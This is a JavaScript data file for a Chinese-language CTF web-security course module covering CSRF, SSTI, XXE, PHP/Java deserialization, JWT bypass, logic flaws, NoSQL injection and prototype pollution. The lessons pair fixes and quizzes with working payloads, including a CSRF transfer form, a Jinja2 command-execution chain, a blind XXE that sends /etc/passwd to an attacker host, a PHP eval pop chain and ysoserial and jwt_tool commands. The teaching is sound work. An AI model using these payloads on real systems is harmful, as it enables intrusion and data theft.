/* PART 8 · 高级漏洞（下）：CSRF → 原型链污染 */
COURSE.modules.push({
  id: "p5b",
  title: "PART 8 · 高级漏洞",
  weeks: "第 15–18 周",
  summary: "需要更多前置知识的漏洞：CSRF、模板注入、XML、反序列化、认证绕过、逻辑漏洞、NoSQL、原型链污染。全部要学，学到这里你已经开始「读源码找链」而不是「背 payload」。",
  lessons: [
    {
      id: "p5l10",
      title: "CSRF：借你的手发请求",
      est: 30,
      goal: "理解「浏览器自动带 Cookie」为什么能变成攻击，以及 Token / SameSite / Origin 各自防住了什么。",
      sections: [
        { type: "p", text: "CSRF（跨站请求伪造）不偷你的 Cookie，也不读你的数据。它只做一件事：<b>让浏览器带着你的 Cookie，去发一个你没想发的请求。</b>因为 Cookie 是「按域名自动附带的」，浏览器不会问「这是不是你自己点的」。" },
        { type: "code", lang: "html", title: "最小 PoC（攻击者页面）", src: `<!-- 受害者登录了 bank.com 后，访问攻击者页面即触发 -->
<form action="https://bank.com/transfer" method="POST" id="f">
  <input name="to" value="hacker">
  <input name="amount" value="10000">
</form>
<script>document.getElementById('f').submit()</script>

<!-- 页面看起来什么都没发生，请求已经带着受害者的 Cookie 发出去了 -->` },
        { type: "table", title: "成立条件与防护手段", head: ["条件 / 手段", "说明"], rows: [
          ["前提 1", "目标用 Cookie 维持身份（Session/Cookie 认证）"],
          ["前提 2", "敏感操作只校验「有没有登录」，没有额外凭证"],
          ["CSRF Token", "每个表单带一次性随机令牌，攻击者跨站拿不到它"],
          ["SameSite Cookie", "Lax：跨站 POST 不带 Cookie；Strict：跨站一律不带"],
          ["校验 Origin/Referer", "请求来源不是自己站点就拒绝"],
          ["二次验证", "转账/改密要求再输密码或验证码（最稳）"]
        ]},
        { type: "h", text: "为什么 CSRF Token 能防住" },
        { type: "p", text: "同源策略让攻击者的页面<b>读不到</b>目标站点的页面内容——包括页面里的 Token。所以攻击者能「让浏览器发请求」，但发不出「带正确 Token 的请求」。这就是 CSRF 防护的核心逻辑：<b>把「身份」和「本次操作」绑在一起。</b>" },
        { type: "code", lang: "php", title: "后端怎么校验 Token", src: `<?php
session_start();
// 生成：只有本站页面能拿到这个值
$token = bin2hex(random_bytes(16));
$_SESSION['csrf'] = $token;
// 页面：<input type="hidden" name="csrf" value="<?= $token ?>">

// 校验：POST 上来的 token 必须和 session 里的一致
if (!hash_equals($_SESSION['csrf'], $_POST['csrf'] ?? '')) {
    die("CSRF token 校验失败");
}
?>` },
        { type: "code", lang: "html", title: "常见变体", src: `GET 型：<img src="https://bank.com/transfer?to=hacker&amount=10000">
  -> 说明敏感操作绝不能用 GET

JSON 型：需要用表单发 application/json 通常不行，
  但目标若接收 text/plain 或 x-www-form-urlencoded 的 JSON，就能打

配合 XSS：XSS 能读页面里的 Token，CSRF 防护直接失效
  -> 所以 XSS 比 CSRF 危险得多` },
        { type: "note", text: "CTF 里 CSRF 题常考「让你构造一个 PoC 页面并提交给 bot 访问」。要点：<b>表单自动提交、目标站点的 Cookie 要被带上、别用 fetch（会被 CORS 拦）</b>。" }
      ],
      code: [],
      labs: [
        { name: "PortSwigger · CSRF", url: "https://portswigger.net/web-security/csrf" },
        { name: "PortSwigger · SameSite 与 CSRF", url: "https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions" }
      ],
      quiz: [
        "CSRF 为什么不需要知道受害者的 Cookie？",
        "SameSite=Lax 能防住哪类 CSRF，防不住哪类？",
        "有了 XSS 之后 CSRF Token 还有用吗？为什么？",
        "为什么敏感操作不能用 GET？",
        "写出一个最小 CSRF PoC 页面的结构。"
      ]
    },
    {
      id: "p5l11",
      title: "SSTI：模板注入",
      est: 35,
      goal: "能识别「用户输入被当模板解析」，知道 Jinja2/Twig/FreeMarker 的探测与利用思路。",
      sections: [
        { type: "p", text: "模板引擎本来负责把数据填进 HTML。但如果你能把 <code>{{ ... }}</code> 之类的内容塞进模板<b>源码</b>，模板引擎就会把它当表达式求值——这就是 SSTI（服务端模板注入）。它通常来自「用用户输入拼模板」或「用模板引擎渲染用户提供的字符串」。" },
        { type: "code", lang: "php", title: "漏洞是怎么产生的", src: `<?php
// 危险：把用户输入当成模板源码渲染
$name = $_GET['name'];
echo $twig->render('Hello {{ name }}', ['name' => ...]);   // 安全（name 只是数据）

// 危险写法（很多教学题故意这么写）
echo $twig->createTemplate('Hello ' . $_GET['name'])->render([]);
// 输入 {{7*7}} 就会输出 49
?>` },
        { type: "table", title: "一句话判断有没有 SSTI", head: ["输入", "回显", "说明"], rows: [
          ["{{7*7}}", "49", "Jinja2（Python）、Twig（PHP）、Spring 的 Thymeleaf 类"],
          ["${7*7}", "49", "FreeMarker（Java）、部分 Thymeleaf 表达式"],
          ["<%= 7*7 %>", "49", "ERB（Ruby）"],
          ["#{7*7}", "49", "Ruby 插值、部分 Java 表达式语言"],
          ["${7*7} 或 {{7*7}} 无变化", "原样", "可能被转义，或没有 SSTI"]
        ]},
        { type: "code", lang: "python", title: "Jinja2（Flask）常见探测与利用思路", src: `# 1. 确认模板引擎
{{7*7}}

# 2. 看配置（Flask 的 config 对象是全局的）
{{ config }}
{{ config.items() }}

# 3. 从内置对象出发，找能执行命令的类
{{ ''.__class__.__mro__[1].__subclasses__() }}
# 在返回的大列表里找 Popen / os 相关类，再调用
{{ ''.__class__.__mro__[1].__subclasses__()[<下标>]('id',shell=True).communicate() }}

# 4. 常见过滤绕过思路
#   .__ 被过滤   -> 用 attr 过滤器：{{ 'a'.__class__ }} 换成 {{ 'a'|attr('__class__') }}
#   [] 被过滤    -> 用 ( ) 调用的等价方式
#   关键字被过滤 -> 用字符串拼接或 request.args 传参` },
        { type: "code", lang: "python", title: "算一下探测链的原理", src: `# ''.__class__            -> <class 'str'>
# ''.__class__.__mro__    -> (str, object)   找基类
# [1] 就是 object
# object.__subclasses__() -> 所有已加载的子类
# 目标：找到能执行命令的类（如 subprocess.Popen）或能读文件的类
#
# 所以整条链是：字符串对象 -> 它的类 -> 基类 -> 全部子类 -> 挑一个危险类 -> 调用` },
        { type: "note", text: "SSTI 的利用链和「沙箱里有什么对象」强相关：同一个 payload 在本地能跑，在题目里可能因为禁了某个类就失效。所以必须<b>有源码就看源码，没源码就逐个探测</b>——这是最依赖「读源码」能力的一类题。" },
        { type: "h", text: "修复" },
        { type: "list", items: [
          "用户输入永远只作为<b>模板变量</b>传入，不要拼进模板源码。",
          "必须动态渲染时，用沙箱化模板（如 Jinja2 SandboxedEnvironment）并限制可用对象。",
          "把模板引擎的调试模式关掉；错误信息不要直接回显。",
          "限制模板能访问的对象：传入 <code>autoescape=True</code>，禁用 <code>__</code> 属性访问。"
        ]}
      ],
      code: [],
      labs: [
        { name: "PortSwigger · SSTI", url: "https://portswigger.net/web-security/server-side-template-injection" },
        { name: "SSTI 常用 payload 合集", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" }
      ],
      quiz: [
        "{{7*7}} 返回 49，说明服务器上发生了什么？",
        "SSTI 利用为什么要从「字符串的类」出发？",
        "Flask 的 config 对象为什么能泄露信息？",
        "说出两种常见过滤（__ / []）的绕过思路。",
        "为什么说 SSTI 是最依赖读源码的一类题？"
      ]
    },
    {
      id: "p5l12",
      title: "XXE：XML 外部实体",
      est: 30,
      goal: "理解 XML 实体为什么能读文件、打内网，以及盲 XXE 的带外思路。",
      sections: [
        { type: "p", text: "XML 允许在 DOCTYPE 里定义「实体」，实体的值可以是一个外部 URI。解析器读到 <code>&xxe;</code> 时，会去读取那个 URI 指向的内容并替换进来——如果这个 URI 是 <code>file:///etc/passwd</code>，服务端文件就被读出来了。" },
        { type: "code", lang: "xml", title: "最小 PoC（有回显）", src: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><name>&xxe;</name></root>` },
        { type: "code", lang: "xml", title: "盲 XXE：把内容带外", src: `<!-- 页面不回显，用外部 DTD 把读到的内容拼进请求发给攻击者 -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">
  %dtd;
]>

<!-- evil.dtd 内容：把 %file 的内容塞进 URL 参数，向攻击者发起请求 -->
<!-- <!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker/?d=%file;'>"> %all; -->` },
        { type: "table", title: "XXE 的三种打法", head: ["场景", "手法", "前提"], rows: [
          ["有回显", "直接 &xxe; 读文件", "解析结果的字段被显示出来"],
          ["无回显", "外部 DTD 把内容带外（OOB）", "服务器能主动访问外网（DNS/HTTP）"],
          ["无外网", "报错信息带出（error-based）", "报错被回显，且实体能被拼进报错"],
          ["打内网", "ENTITY 指向内网 http 服务，做 SSRF", "服务器能访问内网"]
        ]},
        { type: "code", lang: "xml", title: "进阶：读 PHP 源码（绕过 filter 限制）", src: `<!-- 读不到文件时，用 php://filter 让文件内容变成 base64 再带出 -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
]>
<root><name>&xxe;</name></root>` },
        { type: "p", text: "<b>前提条件</b>：服务的 XML 解析器允许外部实体。PHP 的 libxml 2.9 以前默认开启，之后默认关闭（但代码里用 <code>LIBXML_NOENT</code> 等选项仍可能打开）。Java 的 DocumentBuilderFactory 默认也有此问题，需要手动关闭。" },
        { type: "h", text: "修复" },
        { type: "list", items: [
          "禁用 DTD 与外部实体：PHP 用 libxml_disable_entity_loader(true)（旧版），新环境用 <code>LIBXML_NONET</code>。",
          "Java：<code>factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true)</code>。",
          "Python：lxml 用 <code>resolve_entities=False</code>；defusedxml 直接替换标准库解析器。",
          "实在不需要 XML 就换成 JSON。"
        ]},
        { type: "note", text: "XXE 题的第一动作是<b>确认 XML 解析点有没有回显</b>。有回显就直接读；没有就先试 DNSLog 看有没有回连（判断能否带外），再决定用 OOB 还是报错。" }
      ],
      code: [],
      labs: [
        { name: "PortSwigger · XXE", url: "https://portswigger.net/web-security/xxe" },
        { name: "CTFHub · XXE 专项", url: "https://www.ctfhub.com/" }
      ],
      quiz: [
        "XXE 依赖哪个 XML 特性？",
        "盲 XXE 怎么把数据带出来？需要什么前提？",
        "为什么新版 libxml 默认没有这个问题？",
        "php://filter 在 XXE 里有什么用处？",
        "列出两条修复 XXE 的方法。"
      ]
    },
    {
      id: "p5l13",
      title: "反序列化（PHP）",
      est: 40,
      goal: "看懂 PHP 序列化字符串，理解魔术方法如何被串成利用链（pop chain）。",
      sections: [
        { type: "p", text: "序列化是把对象变成字符串，反序列化是把字符串还原成对象。危险点在于：<b>反序列化一个可控的字符串，等于让攻击者构造对象。</b>而对象在被创建、销毁、被当字符串用时，会自动触发魔术方法——这些魔术方法里如果有危险函数，就有了链。" },
        { type: "code", lang: "php", title: "序列化格式", src: `<?php
class A { public $cmd = "whoami"; }
echo serialize(new A());
// O:1:"A":1:{s:3:"cmd";s:6:"whoami";}

// O: 对象  s: 字符串  i: 整数  a: 数组  b: 布尔  N: null
// 数字是长度，必须完全匹配，否则解析失败
// -> 这也是绕过技巧：改长度/属性个数，让 __wakeup 前的解析行为变化
?>` },
        { type: "code", lang: "php", title: "魔术方法 = 链上的触发点", src: `__construct()   new 时调用（反序列化时不触发）
__wakeup()      反序列化时立刻调用
__destruct()    对象销毁时调用
__toString()    被当字符串用时调用（echo / 拼接）
__call()        调用不存在的方法时
__get()/__set() 访问不存在属性时
__sleep()       序列化时调用
__invoke()      对象被当函数调用时

// 典型链：unserialize 入口 -> __wakeup -> ... -> __destruct -> 危险函数` },
        { type: "code", lang: "php", title: "一个最小的利用链", src: `<?php
class Start {
    public $obj;
    function __destruct() {
        $this->obj->run();      // 销毁时调用 obj 的 run()
    }
}
class Exec {
    public $cmd;
    function run() {
        eval($this->cmd);        // 危险函数
    }
}
// 构造：让 Start.obj 指向 Exec，并把 cmd 设成我们的代码
$payload = new Start();
$payload->obj = new Exec();
$payload->obj->cmd = "system('id');";
echo serialize($payload);
// 提交这串字符串给 unserialize() 即可执行
?>` },
        { type: "h", text: "找链的方法（重点）" },
        { type: "steps", items: [
          "先找入口：代码里哪里调用了 <code>unserialize()</code>，参数是否可控。",
          "列出所有魔术方法：每个类里有哪些 <code>__wakeup</code> / <code>__destruct</code> / <code>__toString</code>。",
          "从魔术方法里找「能被我控制的方法调用」：<code>$this->x->y()</code> 这种，x 可控就能换类。",
          "顺着调用走，直到遇到危险函数（eval、system、include、文件写）。",
          "把路径上的属性值按顺序填好，序列化出来提交。",
          "工具：phpggc 可以生成常见框架的链（ThinkPHP、Laravel、Guzzle）。"
        ]},
        { type: "table", title: "常见过滤与绕过", head: ["过滤", "绕过思路"], rows: [
          ["过滤 O: 开头", "用 a: 数组嵌套对象；或用 C: 自定义序列化"],
          ["过滤 \"类名\"", "大小写、字符串偏移、PHP 7.4 的 C: 格式"],
          ["校验属性个数", "改 O:1:\"A\":1: 里的 1 为 2（旧版 PHP 会跳过 __wakeup 的某些检查）"],
          ["__wakeup 里 die", "用 __destruct 链，或触发其他魔术方法"]
        ]},
        { type: "note", text: "反序列化不是「背 payload」，而是<b>读代码找路径</b>。真正的题目里类都藏在框架源码里，所以要会顺着 composer.json 找依赖、顺着自动加载找类文件。" }
      ],
      code: [],
      labs: [
        { name: "phpggc（PHP 反序列化链生成）", url: "https://github.com/ambionics/phpggc" },
        { name: "CTFHub · PHP 反序列化", url: "https://www.ctfhub.com/" }
      ],
      quiz: [
        "s:3:\"cmd\" 里的 3 代表什么？长度不对会怎样？",
        "为什么 __destruct 常被用作链尾？",
        "pop 链是什么意思？",
        "写出找链的第一步和第二步。",
        "phpggc 是做什么的？"
      ]
    },
    {
      id: "p5l14",
      title: "反序列化（Java）与组件漏洞",
      est: 40,
      goal: "知道 Java 反序列化的入口、识别组件与版本，理解 ysoserial 与 JNDI 注入。",
      sections: [
        { type: "p", text: "Java 的反序列化问题更「工程化」：入口很多，利用链大多来自第三方库（CommonsCollections 等），所以题目的难点是<b>识别组件和版本</b>，而不是从零构造链。" },
        { type: "code", lang: "text", title: "Java 反序列化的入口", src: `ObjectInputStream.readObject()

常见的数据位置：
- Cookie / Header：rememberMe、X-Auth 等 base64 字段
- 表单参数：base64 后的序列化字节（开头是 rO0AB）
- RMI / RPC / JNDI 调用
- 框架内部：Shiro、Fastjson、Jackson、XStream` },
        { type: "table", title: "常见利用链家族", head: ["组件", "利用链", "特征"], rows: [
          ["CommonsCollections 3.x", "CC1 / CC3 / CC5 / CC6 / CC7", "commons-collections.jar 版本"],
          ["CommonsBeanutils", "CB1", "commons-beanutils.jar"],
          ["Shiro", "rememberMe 反序列化", "Cookie 里有 rememberMe=deleteMe 或 base64 大串"],
          ["Fastjson", "autoType 绕过", "JSON 里 @type 字段"],
          ["Log4j2", "JNDI 注入（log4shell）", "日志里出现 ${jndi:ldap://...}"],
          ["Jackson", "多态反序列化", "enableDefaultTyping 配置"]
        ]},
        { type: "h", text: "做题流程" },
        { type: "steps", items: [
          "看到 <code>rO0AB</code> 开头的 base64，或名为 rememberMe 的 Cookie，基本可以确定是 Java 反序列化。",
          "去找组件：能读源码就看 pom.xml / build.gradle / Web-INF/lib；不能读就靠报错、栈信息、页面指纹。",
          "确定版本区间：同一家族的不同版本对应不同链（如 CC3 与 CC1 的 payload 不同）。",
          "用 ysoserial 生成对应链的 payload，做 base64 后提交。",
          "JNDI 类场景，改用 ldap/rmi 外部服务接收请求（JNDIExploit、rogue-jndi）。"
        ]},
        { type: "code", lang: "bash", title: "ysoserial 基本用法", src: `# 生成 CC1 链的 payload（执行命令）
java -jar ysoserial.jar CommonsCollections1 "touch /tmp/pwned" > payload.bin

# base64 后提交
base64 -w0 payload.bin

# 常见链名
# CommonsCollections1/3/5/6/7、CommonsBeanutils1、URLDNS（只做探测）` },
        { type: "note", text: "Java 题最省时间的判断：<b>先看有没有 rO0AB / rememberMe / Fastjson 的 @type</b>。有就直接走对应链，没有就去读依赖列表。版本号决定了用哪条链，这一步错了 payload 一定打不通。" }
      ],
      code: [],
      labs: [
        { name: "ysoserial", url: "https://github.com/frohoff/ysoserial" },
        { name: "JNDI 注入工具 JNDIExploit", url: "https://github.com/feihong-cs/JNDIExploit" }
      ],
      quiz: [
        "Java 反序列化的入口函数是什么？",
        "Shiro 的 rememberMe 为什么是经典入口？",
        "为什么「确定版本」比「找链」更关键？",
        "ysoserial 是做什么的？URLDNS 链有什么特别？",
        "log4shell 的触发字符串长什么样？"
      ]
    },
    {
      id: "p5l15",
      title: "认证绕过：Session / JWT / Cookie",
      est: 35,
      goal: "掌握三类「冒充身份」的常用手法，并能用工具验证。",
      sections: [
        { type: "p", text: "认证绕过是 CTF 里性价比最高的一类：不用拿 shell，改一个字段就能进后台。" },
        { type: "code", lang: "text", title: "JWT 的四类攻击", src: `1. alg 改成 none，删掉签名段
   {"alg":"none"} . payload . （空签名）
   -> 服务器若没显式拒绝 none，直接通过

2. 弱密钥爆破
   用 jwt_tool / hashcat，字典来自常见弱口令

3. 算法混淆（RS256 -> HS256）
   前提：服务器用公钥验证，但代码里把公钥当 HS256 的密钥用
   -> 用公钥当 HMAC 密钥重新签名

4. kid 注入
   kid 指向可控文件（../dev/null）或直接拼进 SQL
   -> 用空密钥 / 用已知文件内容当密钥` },
        { type: "code", lang: "bash", title: "jwt_tool 常用命令", src: `python3 jwt_tool.py <JWT> -M at            # 自动跑各种攻击
python3 jwt_tool.py <JWT> -C -d wordlist.txt # 爆破 HS256 密钥
python3 jwt_tool.py <JWT> -X a             # alg=none
python3 jwt_tool.py <JWT> -X k -pk public.pem  # 算法混淆` },
        { type: "table", title: "Session / Cookie 攻击面", head: ["手法", "说明"], rows: [
          ["session id 可预测", "时间戳、自增值、MD5(用户名) 之类"],
          ["伪造 Cookie 里的权限字段", "role=admin、is_admin=1，后端直接信任"],
          ["Session Fixation", "让受害者用攻击者已知的 session id 登录"],
          ["Cookie 里是序列化数据", "PHP/Java 反序列化入口"],
          ["JWT 放在 localStorage", "XSS 可直接读走"] 
        ]},
        { type: "h", text: "判断顺序（按成本从低到高）" },
        { type: "steps", items: [
          "先看 token 结构：JWT 就 base64 解开 header/payload，看 role 之类的字段。",
          "改 payload 里的权限字段，看签名是否被校验（不校验直接过 = 最简单）。",
          "查 alg 是否接受 none，用 jwt_tool -X a 试。",
          "用常见弱口令爆破 HS256 密钥。",
          "看 kid/x5u/jku 等字段是否可控。",
          "以上都不行，再考虑 session 伪造或反序列化。"
        ]},
        { type: "code", lang: "python", title: "JWT 结构（自己拆一遍）", src: `import base64, json
tok = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEsInJvbGUiOiJ1c2VyIn0.xxxxx"
h, p, s = tok.split(".")
pad = lambda x: x + "=" * (-len(x) % 4)
print(json.loads(base64.urlsafe_b64decode(pad(h))))
print(json.loads(base64.urlsafe_b64decode(pad(p))))
# 输出：{'alg': 'HS256', 'typ': 'JWT'}  {'uid': 1, 'role': 'user'}
# 注意：payload 是"明文"，只是 base64，不是加密` },
        { type: "note", text: "记住一个底层事实：<b>JWT 的安全性 100% 依赖签名校验</b>。payload 谁都能看、谁都能改。所有攻击最终都是「让服务器接受一个我没签过的 payload」。" }
      ],
      code: [],
      labs: [
        { name: "PortSwigger · JWT", url: "https://portswigger.net/web-security/jwt" },
        { name: "jwt_tool", url: "https://github.com/ticarpi/jwt_tool" }
      ],
      quiz: [
        "alg=none 为什么能绕过验证？服务器该怎么防？",
        "RS256 混淆攻击的前提是什么？",
        "为什么 session id 必须足够随机？",
        "kid 字段能怎么被利用？",
        "JWT 的 payload 是加密的吗？"
      ]
    },
    {
      id: "p5l16",
      title: "逻辑漏洞与越权",
      est: 30,
      goal: "理解「代码没写错，但业务逻辑被绕过」，建立挖逻辑漏洞的固定流程。",
      sections: [
        { type: "p", text: "逻辑漏洞没有「注入点」这种明确标志，它的定义是：<b>功能按设计跑起来了，但某个假设被攻击者破坏了</b>——比如「用户只会改自己的 id」「金额只能是正数」「支付必须先付款」。" },
        { type: "table", title: "常见类型", head: ["类型", "具体表现", "怎么试"], rows: [
          ["水平越权", "改 id 看别人的订单/资料", "把用户 id 改成相邻值"],
          ["垂直越权", "普通用户直接调管理员接口", "抓管理员的请求，换成普通账号重放"],
          ["价格篡改", "改单价、数量为负、优惠券叠加", "改请求体里的金额字段"],
          ["支付绕过", "跳过支付步骤、改金额、重放", "删掉中间步骤直接请求最后一步"],
          ["验证码问题", "复用、爆破、短信轰炸、前端校验", "同一验证码用两次；写成 0000–9999 爆破"],
          ["流程竞争", "同一优惠券并发使用多次", "多线程同时发请求"]
        ]},
        { type: "h", text: "挖逻辑漏洞的四步" },
        { type: "steps", items: [
          "正常走一遍完整流程，用 Burp 记下<b>每一个</b>请求（注册、登录、下单、支付、退款）。",
          "逐个问：这一步的「前提」是服务器保证的，还是前端/上一步保证的？",
          "改掉你觉得「不该被改」的参数：id、数量、金额、状态、时间、角色。",
          "重复、并发、乱序地发请求——很多漏洞只在「同时发生」时出现。"
        ]},
        { type: "code", lang: "text", title: "一个典型的越权", src: `# 正常：GET /api/order?id=1001      （当前用户自己的订单）
# 越权：GET /api/order?id=1002      （别人的订单，服务器没校验归属）

# 修复：从 session 里取用户 id，而不是从请求里取
# 错误：SELECT * FROM orders WHERE id = $_GET['id']
# 正确：SELECT * FROM orders WHERE id = ? AND user_id = ?` },
        { type: "code", lang: "bash", title: "并发竞争的最小验证", src: `# 用同一张优惠券同时发 20 个请求，看是否都被接受
seq 20 | xargs -P 20 -I{} curl -s -b "session=..." \\
  -X POST https://target/api/coupon/use -d "code=XXXX" -o /dev/null -w "%{http_code}\\n"

# 原理：后端顺序是「查是否已用 -> 用掉 -> 更新状态」
# 并发时多个请求在「查」之后、更新之前都通过了检查` },
        { type: "note", text: "逻辑漏洞无法靠字典扫，全靠对业务流程的理解。<b>这类题最考耐心和观察力，也最接近真实的渗透测试</b>——因为它是真正「读懂系统」的体现。" }
      ],
      code: [],
      labs: [],
      quiz: [
        "水平越权和垂直越权的区别？",
        "「前端隐藏了按钮」为什么不算权限控制？",
        "并发竞争利用的是什么缺陷？",
        "挖逻辑漏洞的第一步是什么？",
        "越权漏洞在代码层应该怎么修？"
      ]
    },
    {
      id: "p5l17",
      title: "NoSQL 注入",
      est: 25,
      goal: "理解 MongoDB 查询对象的注入方式，以及和 SQL 注入的共同点。",
      sections: [
        { type: "p", text: "NoSQL 数据库（MongoDB 最常见）用「对象」来描述查询条件。如果后端把用户输入直接拼进查询对象，攻击者就能构造出「匹配任意值」的条件——这和 SQL 注入同源，只是注入的载体从字符串换成了对象。" },
        { type: "code", lang: "js", title: "MongoDB 注入原理", src: `// 正常查询
db.users.find({ username: name, password: pw })

// 攻击：让 password 变成「不等于 1」的查询对象
// 请求：?username=admin&password[$ne]=1
// 后端解析成 { username: 'admin', password: { $ne: 1 } }
// -> 只要密码不等于 1 就匹配，等于绕过密码校验

// 其他常用操作符
?username[$regex]=^adm&password[$ne]=1
?username[$gt]=&password[$gt]=` },
        { type: "table", title: "常用操作符与含义", head: ["操作符", "含义", "注入用法"], rows: [
          ["$ne", "不等于", "$ne=1 让密码校验永远为真"],
          ["$gt / $lt", "大于 / 小于", "$gt= 空串匹配任何存在的值"],
          ["$regex", "正则匹配", "逐字符猜用户名/密码"],
          ["$exists", "字段存在", "探测字段"],
          ["$where", "JS 表达式（旧版）", "直接执行 JS，危害最大"]
        ]},
        { type: "code", lang: "js", title: "后端漏洞代码与修复", src: `// 危险：直接把 req.body 当年的查询条件
app.post('/login', (req, res) => {
  db.collection('users').findOne({ username: req.body.username, password: req.body.password })
    .then(u => res.send(u ? 'ok' : 'fail'));
});

// 修复 1：强制把参数转成字符串
const username = String(req.body.username);
// 修复 2：用 express-mongo-sanitize 去掉 $ 开头的键
// 修复 3：密码比对在应用层做（hash 比对），不要拼进查询条件` },
        { type: "note", text: "CTF 里 NoSQL 注入的入口通常是登录框；用 <code>[$ne]=1</code> 或 <code>[$regex]</code> 试一下就知道。判据和 SQL 盲注一样：<b>看响应差异</b>。" }
      ],
      code: [],
      labs: [
        { name: "PortSwigger · NoSQL injection", url: "https://portswigger.net/web-security/nosql-injection" }
      ],
      quiz: [
        "$ne 在 MongoDB 里是什么语义？",
        "为什么 ?password[$ne]=1 会被解析成对象？",
        "NoSQL 注入和 SQL 注入共同的根源是什么？",
        "怎么防御 NoSQL 注入？"
      ]
    },
    {
      id: "p5l18",
      title: "原型链污染",
      est: 35,
      goal: "理解 Object.prototype 被污染后为什么会影响全局，以及常见入口与危害。",
      sections: [
        { type: "p", text: "JavaScript 里所有普通对象都继承自 <code>Object.prototype</code>。如果你能把一个属性写进这个「公共祖先」，那么之后<b>任何</b>对象访问这个属性都会拿到它——即使你根本没在自己身上定义过。很多「深拷贝 / 合并配置」的函数就会无意中提供这个写入能力。" },
        { type: "code", lang: "js", title: "漏洞原理（不安全的 merge）", src: `function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === "object") {
      target[key] = target[key] || {};
      merge(target[key], source[key]);   // ← 没有过滤 __proto__
    } else {
      target[key] = source[key];
    }
  }
}

merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
console.log({}.isAdmin);   // true  —— 所有对象都被污染了` },
        { type: "code", lang: "js", title: "为什么「所有对象」都受影响", src: `// 每个对象字面量 { } 的原型都是 Object.prototype
const a = {};
const b = {};        // a、b、c 都共享同一个 Object.prototype
console.log(a.isAdmin);  // true
console.log(b.isAdmin);  // true

// prototype vs __proto__
// Foo.prototype           : 构造函数的「原型对象」，给它加属性影响所有实例
// obj.__proto__           : 对象自身指向的原型（通常就是 Foo.prototype）
// 所以 obj.__proto__.x = 1  等价于给原型链上层加属性` },
        { type: "table", title: "常见入口与危害", head: ["入口", "说明"], rows: [
          ["JSON 参数合并", "如要求前端把配置对象 POST 上来，后端 deepMerge"],
          ["URL 参数解析", "qs 库老版本对 a[__proto__][x]=1 的解析"],
          ["模板引擎配置合并", "污染 options 影响后续渲染"],
          ["危害：模板注入", "污染模板引擎的设置，导致代码执行"],
          ["危害：沙箱逃逸", "污染子进程选项（如 shell、env）"],
          ["危害：绕过校验", "污染 isAdmin 之类的判断字段"]
        ]},
        { type: "h", text: "怎么修" },
        { type: "list", items: [
          "合并前过滤键：拒绝 <code>__proto__</code>、<code>constructor</code>、<code>prototype</code>。",
          "用 <code>Object.create(null)</code> 创建无原型对象存放配置。",
          "用 <code>Object.defineProperty</code> 定义属性，或用 <code>Map</code> 代替普通对象。",
          "依赖库要升级：lodash、qs 等历史版本已有修复。",
          "解析 JSON 后做一次递归的白名单过滤。"
        ]},
        { type: "note", text: "原型链污染题在 Node.js 方向很常见。判断方法：<b>找「合并 / 深拷贝」的入口</b>；利用的关键是「污染完能不能影响后续某个危险操作」，单靠污染本身通常没意义。" }
      ],
      code: [],
      labs: [
        { name: "PortSwigger · Prototype pollution", url: "https://portswigger.net/web-security/prototype-pollution" }
      ],
      quiz: [
        "__proto__ 和 prototype 的区别？",
        "为什么污染后「所有对象」都受影响？",
        "原型链污染最常见的入口是什么？",
        "污染之后通常要怎么才能造成实际危害？",
        "列出两种防御方式。"
      ]
    }
  ]
});
